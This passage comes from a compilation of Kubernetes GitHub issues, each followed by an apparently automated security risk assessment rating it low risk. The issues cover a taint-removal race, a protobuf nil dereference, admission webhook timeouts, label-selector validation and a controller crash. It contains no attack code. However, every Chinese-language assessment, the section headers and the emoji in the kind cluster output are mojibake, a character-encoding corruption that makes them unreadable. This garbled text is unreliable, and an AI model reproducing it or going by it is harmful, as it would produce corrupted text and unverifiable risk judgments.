Start the kubelet after not-ready stats has been updated
Use kubectl to create some new taint when the Pause is triggered
Check if the taint is still there after the node was ready

#### Anything else we need to know?

We should probably use Update instead of Patch.
Besides, I don't like it to get node from apiserver cache at first try, because cache data does not guarantee data effectiveness, this could cause inconsistency of node's taints when taints were updated concurrently. This actually happened in another test we ran before, but I didn't keep the logs.

#### Kubernetes version

<details>

```console
Client Version: version.Info{Major:"1", Minor:"25+", GitVersion:"v1.25.3", GitCommit:"d35bc1202891fc160168410ef38cb06782f9c1db", GitTreeState:"dirty", BuildDate:"2024-10-23T16:47:38Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"25+", GitVersion:"v1.25.3", GitCommit:"d35bc1202891fc160168410ef38cb06782f9c1db", GitTreeState:"dirty", BuildDate:"2024-10-23T16:46:14Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesçš„node_lifecycle_controllerä¸­ï¼Œå½“å°è¯•ç§»é™¤æ—§çš„æ±¡ç‚¹ï¼ˆtaintsï¼‰æ—¶ï¼Œå¯èƒ½ä¼šæ„å¤–åœ°ç§»é™¤æ–°æ·»åŠ çš„æ±¡ç‚¹ã€‚åŸå› æ˜¯åœ¨è°ƒç”¨`RemoveTaintOffNode`å‡½æ•°æ—¶ï¼Œä½¿ç”¨äº†Patchæ–¹æ³•ï¼Œç”±äºåœ¨`Get`å’Œ`Patch`ä¹‹é—´æ²¡æœ‰å¤„ç†å¹¶å‘ä¿®æ”¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…¶ä»–è¿›ç¨‹åœ¨æ­¤æœŸé—´æ·»åŠ çš„æ±¡ç‚¹è¢«è¦†ç›–ã€‚

è¿™ç§æƒ…å†µå¯èƒ½å¯¼è‡´èŠ‚ç‚¹ç¼ºå°‘é¢„æœŸçš„æ±¡ç‚¹ï¼Œä»è€Œå…è®¸æœ¬ä¸åº”è¯¥è¢«è°ƒåº¦åˆ°è¯¥èŠ‚ç‚¹çš„Podè¢«è°ƒåº¦ä¸Šå»ï¼Œå½±å“é›†ç¾¤çš„è°ƒåº¦ç­–ç•¥å’Œå®‰å…¨æ€§ã€‚

ç„¶è€Œï¼Œè¦åˆ©ç”¨è¿™ä¸ªé—®é¢˜ï¼Œæ”»å‡»è€…éœ€è¦æœ‰æƒé™ä¿®æ”¹èŠ‚ç‚¹çš„æ±¡ç‚¹ä¿¡æ¯ï¼Œé€šå¸¸éœ€è¦è¾ƒé«˜çš„æƒé™ï¼ˆå¦‚é›†ç¾¤ç®¡ç†å‘˜æƒé™ï¼‰ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼Œå¦‚æœæ¼æ´çš„åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚å› æ­¤ï¼Œè¯¥é—®é¢˜å±äºä½é£é™©ã€‚

æ­¤å¤–ï¼Œè¯¥é—®é¢˜ä¸ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜å®‰å…¨é£é™©çš„é—®é¢˜ï¼Œä¹Ÿä¸æ¶‰åŠå¤šç”¨æˆ·åœºæ™¯ä¸‹çš„æƒé™æå‡æˆ–è¶Šæƒæ“ä½œã€‚

---

## Issue #128235 Possible nil dereference in `unmarshalFull` if VarintType is executed before `BytesType`

- Issue é“¾æ¥ï¼š[#128235](https://github.com/kubernetes/kubernetes/issues/128235)

### Issue å†…å®¹

#### What happened?

In the `unmarshalFull` function, a nil dereference may occur if the `VarintType` case in the `switch` block is executed before the `BytesType` case.


https://github.com/kubernetes/kubernetes/blob/f1e447b9d32ac325074380d239370cde02a6dbf7/vendor/google.golang.org/protobuf/internal/filedesc/desc_lazy.go#L142-L167

#### What did you expect to happen?

The program should handle such cases correctly without a nil dereference error.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Pass a byte array that contains a tag for `PublicDependency` or `WeakDependency` but does not contain a tag for `Dependency`.

3. Call the `unmarshalFull` function.

#### Anything else we need to know?

Found by Linux Verification Center (linuxtesting.org) with SVACE.
Reporter: Pavel Nekrasov ([p.nekrasov@fobos-nt.ru](mailto:p.nekrasov@fobos-nt.ru)).

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†åœ¨`unmarshalFull`å‡½æ•°ä¸­ï¼Œå¦‚æœ`VarintType`åœ¨`BytesType`ä¹‹å‰æ‰§è¡Œï¼Œå¯èƒ½ä¼šå‘ç”Ÿç©ºæŒ‡é’ˆè§£å¼•ç”¨ã€‚è¿™å¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒï¼Œä»è€Œå¼•å‘æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶ä¼ å…¥`unmarshalFull`å‡½æ•°çš„æ•°æ®ï¼Œå°±å¯èƒ½åˆ©ç”¨è¯¥æ¼æ´å¯¼è‡´æœåŠ¡å´©æºƒã€‚ç„¶è€Œï¼Œè¯¥å‡½æ•°ä½äºå†…éƒ¨åŒ…`google.golang.org/protobuf/internal/filedesc`ï¼Œé€šå¸¸ä¸ç›´æ¥æš´éœ²ç»™å¤–éƒ¨ç”¨æˆ·ã€‚å› æ­¤ï¼Œé™¤éå­˜åœ¨ç‰¹æ®Šçš„æ”»å‡»é¢ï¼Œæ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œä¼ é€’æ¶æ„æ•°æ®ï¼Œå¦åˆ™è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§æœ‰é™ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ”»å‡»è€…éœ€è¦å…·å¤‡ä¸€å®šæƒé™æˆ–ç‰¹æ®Šæ¡ä»¶æ‰èƒ½åˆ©ç”¨è¯¥æ¼æ´ï¼Œä¸”å½±å“ä¸»è¦ä¸ºæœåŠ¡å´©æºƒï¼Œæ•…é£é™©è¯„çº§ä¸ºä½é£é™©ã€‚

---

## Issue #128209 OpenAPI Markdown transformation doesn't handle code blocks well

- Issue é“¾æ¥ï¼š[#128209](https://github.com/kubernetes/kubernetes/issues/128209)

### Issue å†…å®¹

We should [render code blocks properly in OpenAPI](https://github.com/kubernetes/kube-openapi/pull/482).

Right now we don't.

---

There is possibly an argument for not using code blocks in the API reference (for example, if we want equations, there may be better options), but equally we may want labelled code blocks where we put eg MathML or LaTex inside a block and have a downstream renderer do something clever).

For now, let's find a basic fix.

/wg api-expression

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
Issueæè¿°äº†OpenAPIçš„Markdownè½¬æ¢åœ¨å¤„ç†ä»£ç å—æ—¶å­˜åœ¨é—®é¢˜ï¼Œå¸Œæœ›èƒ½å¤Ÿæ­£ç¡®æ¸²æŸ“ä»£ç å—ï¼Œå°¤å…¶æ˜¯å½“ä»£ç å—ä¸­å¯èƒ½åŒ…å«MathMLæˆ–LaTeXç­‰å†…å®¹ã€‚

å¯èƒ½çš„å®‰å…¨é£é™©æ˜¯ï¼Œå¦‚æœå¯¹ä»£ç å—çš„å¤„ç†ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´æ³¨å…¥æ”»å‡»ï¼Œä¾‹å¦‚è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ”»å‡»ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥åœ¨ä»£ç å—ä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œå¹¶ä¸”ä¸‹æ¸¸çš„æ¸²æŸ“å™¨åœ¨æ¸²æŸ“æ—¶æ‰§è¡Œäº†è¿™äº›ä»£ç ï¼Œå°±å¯èƒ½å¯¼è‡´å®‰å…¨é—®é¢˜ã€‚

ä½†è€ƒè™‘åˆ°æ­¤é—®é¢˜ä¸»è¦æ¶‰åŠæ–‡æ¡£æ¸²æŸ“ï¼Œä¸”ç¼ºä¹è¿›ä¸€æ­¥çš„ç»†èŠ‚ï¼Œæ— æ³•ç¡®å®šæ­¤é£é™©æ˜¯å¦èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œä»¥åŠå…¶ä¸¥é‡ç¨‹åº¦ã€‚

æŒ‰ç…§é£é™©åˆ¤æ–­æ ‡å‡†ï¼ŒIssueä¸­å­˜åœ¨å®‰å…¨é£é™©ï¼Œä½†é£é™©è¯„çº§åœ¨Highä»¥ä¸‹ï¼Œå› æ­¤é£é™©è¯„çº§åˆ¤æ–­ä¸ºä½é£é™©ã€‚

---

## Issue #128162 Pod admission can fail due to webhooks + context deadline exceeded, even when all webhooks are set to failurePolicy = Ignore

- Issue é“¾æ¥ï¼š[#128162](https://github.com/kubernetes/kubernetes/issues/128162)

### Issue å†…å®¹

#### What happened?

Pod admission failed with the error "Timeout: request did not complete within requested timeout - context deadline exceeded"

This occurred with Datadog's admission controller, when a default deny policy was applied and the network policy allowing ingress to Datadog's admission controller was missing. This is despite each of the webhook configurations specifying `failurePolicy: Ignore`. I can understand why they did that: failing pod admission basically kills the cluster.

#### What did you expect to happen?

Pod should be successfully admitted since all webhooks were set to `failurePolicy: Ignore`

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create 4 mutating or validating webhooks, each with a timeout of 10 seconds, and failurePolicy of Ignore. The webhooks should return an error.
2. Try admitting a Pod. It should work - failurePolicy is set to Ignore.
3. Add a default deny network policy to the webhook's namespace. This will cause connections from the kube-apiserver to the webhook admission controller to fail with a timeout. Overall, 10 seconds will be spent on each one, totaling 40 seconds.
4. Pod admission fails with "Timeout: request did not complete within requested timeout - context deadline exceeded"

#### Anything else we need to know?

It seems that pod admission has a global 30 second timeout. By specifying 4 webhooks, each with a timeout of 10 seconds, it is possible to exceed that timeout and cause pod admission to fail, **even when all webhooks have failurePolicy set to Ignore**. This also results in a message that just says "context deadline exceeded", and doesn't name the offending webhooks, since they didn't actually cause the failure. This makes it super hard to debug, as you have to dig into the kube-apiserver looks to find the offending webhook. It also seems unintentional: my expectation was that having no webhooks set to `failurePolicy: Fail`, pod admission should not be able to fail due to webhooks.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.31.1-eks-ce1d5eb
```

</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
åœ¨ Kubernetes ä¸­ï¼Œå½“é…ç½®äº†å¤šä¸ª admission webhookï¼Œæ¯ä¸ª webhook è®¾ç½®äº† 10 ç§’çš„è¶…æ—¶æ—¶é—´å¹¶ä¸” failurePolicy ä¸º Ignoreï¼Œå¹¶ä¸”ç”±äºç½‘ç»œç­–ç•¥çš„åŸå› ï¼Œå¯¼è‡´ kube-apiserver æ— æ³•è¿æ¥åˆ°è¿™äº› webhookï¼Œé€ æˆæ¯ä¸ª webhook è¯·æ±‚éƒ½è¶…æ—¶ï¼Œç´¯è®¡è€—æ—¶è¶…è¿‡äº† pod admission çš„å…¨å±€ 30 ç§’è¶…æ—¶æ—¶é—´ï¼Œæœ€ç»ˆå¯¼è‡´ pod admission å¤±è´¥ï¼ŒæŠ¥é”™ "Timeout: request did not complete within requested timeout - context deadline exceeded"ã€‚

è™½ç„¶æ‰€æœ‰çš„ admission webhook éƒ½è®¾ç½®äº† failurePolicy: Ignoreï¼Œä½†ç”±äºå…¨å±€è¶…æ—¶çš„å­˜åœ¨ï¼Œpod admission ä»ç„¶ä¼šå¤±è´¥ã€‚è¿™å¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰çš„é—®é¢˜ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. æ”»å‡»è€…è¦åˆ©ç”¨è¯¥é£é™©ï¼Œéœ€è¦å…·å¤‡åˆ›å»ºæˆ–ä¿®æ”¹ admission webhook é…ç½®æˆ–è€…ç½‘ç»œç­–ç•¥çš„æƒé™ã€‚

4. å¯¹äºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å®æ–½è¯¥æ”»å‡»ï¼Œä¸”éœ€è¦åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSS è¯„çº§åœ¨ high ä»¥ä¸‹ã€‚

å› æ­¤ï¼Œè¯¥é—®é¢˜å­˜åœ¨å®‰å…¨é£é™©ï¼Œä½†æ”»å‡»è€…éœ€è¦è¾ƒé«˜æƒé™æ‰èƒ½åˆ©ç”¨ï¼Œ**é£é™©è¯„çº§ä¸ºä½é£é™©**ã€‚

---

## Issue #128156 [Bug] Missing constraint and validation for label selector's values

- Issue é“¾æ¥ï¼š[#128156](https://github.com/kubernetes/kubernetes/issues/128156)

### Issue å†…å®¹

#### What happened?

Hello,
There are some [constraints](https://kubernetes.io/docs/concepts/overview/working-with-objects/labels/#syntax-and-character-set) that label selector's `values` need to conform:
>* must be 63 characters or less (can be empty),
>* unless empty, must begin and end with an alphanumeric character ([a-z0-9A-Z]),
>* could contain dashes (-), underscores (_), dots (.), and alphanumerics between.

Every label selctor's `values` will be checked [here](https://github.com/kubernetes/kubernetes/blob/e5ba5cd2b0d3bddd4a0393b98fde14960f31a33c/staging/src/k8s.io/apimachinery/pkg/util/validation/validation.go#L166C1-L175C2), and when values is not conforming these constraints, an error will be returned.

`nodeAfffinty.requiredDuringSchedulingIgnoredDuringExecution.nodeSelectorTerms.matchExpressions.values` also needs to conform these constraints (because `matchExpressions` will be parsed as a label selector), but cccording to the [concept documentation](https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/#operators) and the [API documentation](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.31/#nodeselectorrequirement-v1-core), 
Kubernetes only requires `V1NodeSelectorRequirement.values` to be strings. 
>`values` (string array): An array of string values. If the operator is In or NotIn, the values array must be non-empty. If the operator is Exists or DoesNotExist, the values array must be empty. If the operator is Gt or Lt, the values array must have a single element, which will be interpreted as an integer. This array is replaced during a strategic merge patch.

So when creating a pod with invalid `V1NodeSelectorRequirement.values`, no warning or error message appears and the pod is created successfully.
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: node-affinity-test-pod
  namespace: default
spec:
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: int-cmkzofgjsu
            operator: NotIn
            values:
            - '-1' # <- invalid value
  containers:
  - image: nginx
    name: test-container
# pod/node-affinity-test-pod created <- no warning or error here
```
By contrast, when you set an invalid value in matchFields, it will be rejected.
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: node-affinity-test-pod
  namespace: default
spec:
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchFields:
          - key: metadata.name
            operator: NotIn
            values:
            - '-1'
  containers:
  - image: nginx
    name: test-container
# The Pod "node-affinity-test-pod" is invalid: spec.affinity.nodeAffinity.requiredDuringSchedulingIgnoredDuringExecution.nodeSelectorTerms[0].matchFields[0].values[0]: Invalid value: "-1": a lowercase RFC 1123 subdomain must consist of lower case alphanumeric characters, '-' or '.', and must start and end with an alphanumeric character (e.g. 'example.com', regex used for validation is '[a-z0-9]([-a-z0-9]*[a-z0-9])?(\.[a-z0-9]([-a-z0-9]*[a-z0-9])?)*')
```
---
And after creating the first pod successfully, it couldnâ€™t be scheduled even though one node satisfied its `nodeAffinity`. By adding some log codes, we found that when the scheduler tries to parse a `nodeSelectorTerm`, it receives a non-empty `parseErr`(because the value is not conforming label value constraints as stated above), causing it to consider the entire `nodeSelectorTerm` unmatched. [code](https://github.com/kubernetes/kubernetes/blob/d88b4e3b6e34a85f58778b7ef96e64edffff6823/staging/src/k8s.io/component-helpers/scheduling/corev1/nodeaffinity/nodeaffinity.go#L191C2-L193C3) here.

This behavior may cause the scheduler to make unexpected decisions without the user's awareness. More critically, an invalid value will prevent the entire nodeSelectorTerm from matching.

```yaml
nodeSelectorTerms:
 - matchExpressions:
    - matchExpressions1{key, operator, values} -> has an invalid value, but user is not aware of it
    - matchExpressions2{key, operator, values}
    - ...
   matchFields:
    - matchFields1{key, operator, values}
    - matchFields2{key, operator, values}
    - ...
# matchExpressions1 cannot be parsed, so the whole nodeSelectorTerm is considered as not matched in nodeAffinity
```

#### What did you expect to happen?

* Implicit constraints on the [label selector](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/apimachinery/pkg/labels/selector.go)'s `values` field should be specified in the API documentation and also validated before creating the pod. (We think not only `nodeAfffinty.requiredDuringSchedulingIgnoredDuringExecution.nodeSelectorTerms` will be parsed as label selector, other fields in V1Pod also need to be checked for the same reason.)
* Those implicit constraints should also be added to the concept documentation. (will create an issue in kuberentes/website later)


#### How can we reproduce it (as minimally and precisely as possible)?

Use the yaml file above.

#### Anything else we need to know?

/sig bugs scheduling

#### Kubernetes version

Tested on 1.30.2

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesä¸­ï¼ŒnodeAffinityçš„`nodeSelectorTerms`çš„`matchExpressions.values`åœ¨åˆ›å»ºPodçš„æ—¶å€™ï¼Œæ²¡æœ‰è¿›è¡Œæœ‰æ•ˆæ€§éªŒè¯ï¼Œå³ä½¿`values`åŒ…å«æ— æ•ˆçš„å€¼ï¼Œä¹Ÿä¸ä¼šåœ¨åˆ›å»ºPodæ—¶æŠ›å‡ºé”™è¯¯æˆ–è­¦å‘Šã€‚ä½†æ˜¯ï¼Œè¿™ä¼šå¯¼è‡´è°ƒåº¦å™¨åœ¨è°ƒåº¦Podæ—¶æ— æ³•åŒ¹é…åˆ°å¯¹åº”çš„èŠ‚ç‚¹ï¼Œè¿›è€Œå¯¼è‡´Podæ— æ³•è¢«è°ƒåº¦ï¼Œä½†ç”¨æˆ·å¹¶ä¸çŸ¥é“åŸå› ã€‚

è¿™ä¸€é—®é¢˜å¯èƒ½å¯¼è‡´ç”¨æˆ·è¯¯ä»¥ä¸ºPodåˆ›å»ºæˆåŠŸå¹¶å°†è¢«è°ƒåº¦ï¼Œä½†å®é™…ä¸ŠPodå› ä¸ºæ— æ•ˆçš„nodeAffinityè®¾ç½®è€Œæ— æ³•è°ƒåº¦ã€‚è¿™æ˜¯ä¸€ä¸ªå¯ç”¨æ€§å’Œç”¨æˆ·ä½“éªŒé—®é¢˜ï¼Œä½†æ˜¯å¦å­˜åœ¨å®‰å…¨é£é™©ï¼Ÿ

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€è¡Œä¸ºæ¥åˆ›å»ºå«æœ‰æ— æ•ˆ`nodeAffinity`çš„Podã€‚

2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šåˆ›å»ºå«æœ‰æ— æ•ˆ`nodeAffinity`çš„Podå¯èƒ½ä¼šå¯¼è‡´è°ƒåº¦å™¨é¢å¤–çš„å¤„ç†ï¼Œä½†ä¸ä¼šå¯¼è‡´ç³»ç»Ÿå´©æºƒæˆ–æ‹’ç»æœåŠ¡ï¼Œå½±å“ç¨‹åº¦æœ‰é™ï¼Œè¯„åˆ†ä¸å¤ªå¯èƒ½è¾¾åˆ°highä»¥ä¸Šã€‚

4. **åœ¨é£é™©ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™è§†æƒ…å†µéœ€è¦é™çº§å¤„ç†ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹**ï¼šåˆ›å»ºPodéœ€è¦å…·å¤‡ä¸€å®šæƒé™ï¼Œå› æ­¤å³ä½¿æ”»å‡»è€…èƒ½å¤Ÿåˆ›å»ºå¤§é‡å«æœ‰æ— æ•ˆ`nodeAffinity`çš„Podï¼Œä¹Ÿä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

9. **å¦‚æœIssueå¯ä»¥å‘ç”Ÿåœ¨å¤šç”¨æˆ·åœºæ™¯ä¸­ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·èƒ½å¤Ÿå½±å“å’Œè‡ªå·±æƒé™ä¸€æ ·ç”šè‡³æ›´é«˜çš„å…¶ä»–ç”¨æˆ·ï¼Œå¦‚åœ¨è‡ªèº«å®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤è€Œå½±å“åˆ°ä»–äººå®¹å™¨ï¼Œåˆ™åº”åˆ¤æ–­ä¸ºé«˜é£é™©**ï¼šè¯¥é—®é¢˜ä¸ä¼šå½±å“å…¶ä»–ç”¨æˆ·çš„å®¹å™¨æˆ–æƒé™ã€‚

å› æ­¤ï¼Œè¯¥Issueæ¶‰åŠçš„é£é™©è¯„çº§åº”ä¸º**ä½é£é™©**ã€‚

---

## Issue #128121 Crash on kube manager's service-lb-controller after v1.31.0

- Issue é“¾æ¥ï¼š[#128121](https://github.com/kubernetes/kubernetes/issues/128121)

### Issue å†…å®¹

#### What happened?

If kube manager is started with no `cloud-provider`, it looks like the service-lb-controller is instantiated but not started. However, part of its initialization happens on the `Run` method **and** its handlers are added to the informer on instantiation. So the handlers still run and it crashes when they do because there is stuff not initialized, like in this case, the event recorder:
```2024-10-14T11:27:20.573127782Z stderr F 	goroutine 735 [running]:
2024-10-14T11:27:20.573132561Z stderr F 	k8s.io/apimachinery/pkg/util/runtime.logPanic({0x38432a0, 0x5545b00}, {0x2d99000, 0x5480790})
2024-10-14T11:27:20.573137951Z stderr F 		k8s.io/apimachinery/pkg/util/runtime/runtime.go:107 +0xbc
2024-10-14T11:27:20.573154772Z stderr F 	k8s.io/apimachinery/pkg/util/runtime.handleCrash({0x38432a0, 0x5545b00}, {0x2d99000, 0x5480790}, {0x5545b00, 0x0, 0x43d945?})
2024-10-14T11:27:20.573159501Z stderr F 		k8s.io/apimachinery/pkg/util/runtime/runtime.go:82 +0x5e
2024-10-14T11:27:20.573187343Z stderr F 	k8s.io/apimachinery/pkg/util/runtime.HandleCrash({0x0, 0x0, 0xc001e5ec40?})
2024-10-14T11:27:20.573192182Z stderr F 		k8s.io/apimachinery/pkg/util/runtime/runtime.go:59 +0x108
2024-10-14T11:27:20.57319655Z stderr F 	panic({0x2d99000?, 0x5480790?})
2024-10-14T11:27:20.573200548Z stderr F 		runtime/panic.go:770 +0x132
2024-10-14T11:27:20.573204836Z stderr F 	k8s.io/cloud-provider/controllers/service.(*Controller).needsUpdate(0xc000978000, 0xc00324c288, 0xc000cf3688)
2024-10-14T11:27:20.573210016Z stderr F 		k8s.io/cloud-provider/controllers/service/controller.go:606 +0xcbb
2024-10-14T11:27:20.573214644Z stderr F 	k8s.io/cloud-provider/controllers/service.New.func2({0x326c8e0?, 0xc00324c288?}, {0x326c8e0, 0xc000cf3688?})
2024-10-14T11:27:20.573219133Z stderr F 		k8s.io/cloud-provider/controllers/service/controller.go:144 +0x74
2024-10-14T11:27:20.573224062Z stderr F 	k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnUpdate(...)
2024-10-14T11:27:20.573228831Z stderr F 		k8s.io/client-go/tools/cache/controller.go:253
2024-10-14T11:27:20.573233339Z stderr F 	k8s.io/client-go/tools/cache.(*processorListener).run.func1()
2024-10-14T11:27:20.573237758Z stderr F 		k8s.io/client-go/tools/cache/shared_informer.go:976 +0xea
2024-10-14T11:27:20.573241875Z stderr F 	k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0x30?)
2024-10-14T11:27:20.57326562Z stderr F 		k8s.io/apimachinery/pkg/util/wait/backoff.go:226 +0x33
2024-10-14T11:27:20.573270419Z stderr F 	k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0xc00311cf70, {0x380e700, 0xc001e3a8a0}, 0x1, 0xc001e3e780)
2024-10-14T11:27:20.573274767Z stderr F 		k8s.io/apimachinery/pkg/util/wait/backoff.go:227 +0xaf
2024-10-14T11:27:20.573279556Z stderr F 	k8s.io/apimachinery/pkg/util/wait.JitterUntil(0xc001e5a770, 0x3b9aca00, 0x0, 0x1, 0xc001e3e780)
2024-10-14T11:27:20.573284085Z stderr F 		k8s.io/apimachinery/pkg/util/wait/backoff.go:204 +0x7f
2024-10-14T11:27:20.573288433Z stderr F 	k8s.io/apimachinery/pkg/util/wait.Until(...)
2024-10-14T11:27:20.573292821Z stderr F 		k8s.io/apimachinery/pkg/util/wait/backoff.go:161
2024-10-14T11:27:20.573297059Z stderr F 	k8s.io/client-go/tools/cache.(*processorListener).run(0xc000892d80)
2024-10-14T11:27:20.573302339Z stderr F 		k8s.io/client-go/tools/cache/shared_informer.go:972 +0x69
2024-10-14T11:27:20.573306677Z stderr F 	k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
2024-10-14T11:27:20.573310975Z stderr F 		k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x52
2024-10-14T11:27:20.573315874Z stderr F 	created by k8s.io/apimachinery/pkg/util/wait.(*Group).Start in goroutine 690
2024-10-14T11:27:20.573320913Z stderr F 		k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0x73
```

Might have been introduced with 
https://github.com/kubernetes/kubernetes/commit/50c12437604b0cd5a73514389409fc2fde8b91bd


#### What did you expect to happen?

No crash.

#### How can we reproduce it (as minimally and precisely as possible)?

```
â¯ kind create cluster --name ovn
Creating cluster "ovn" ...
 âœ“ Ensuring node image (kindest/node:v1.31.0) ğŸ–¼ 
 âœ“ Preparing nodes ğŸ“¦  
 âœ“ Writing configuration ğŸ“œ 
 âœ“ Starting control-plane ğŸ•¹ï¸ 
 âœ“ Installing CNI ğŸ”Œ 
 âœ“ Installing StorageClass ğŸ’¾ 
Set kubectl context to "kind-ovn"
You can now use your cluster with:

kubectl cluster-info --context kind-ovn

Not sure what to do next? ğŸ˜…  Check out https://kind.sigs.k8s.io/docs/user/quick-start/

â¯ kind export kubeconfig --name ovn
Set kubectl context to "kind-ovn"

â¯ kubectl get pods -A                                                                           
NAMESPACE            NAME                                        READY   STATUS    RESTARTS   AGE
kube-system          coredns-6f6b679f8f-2xrm5                    1/1     Running   0          2m57s
kube-system          coredns-6f6b679f8f-zpkp2                    1/1     Running   0          2m57s
kube-system          etcd-ovn-control-plane                      1/1     Running   0          3m6s
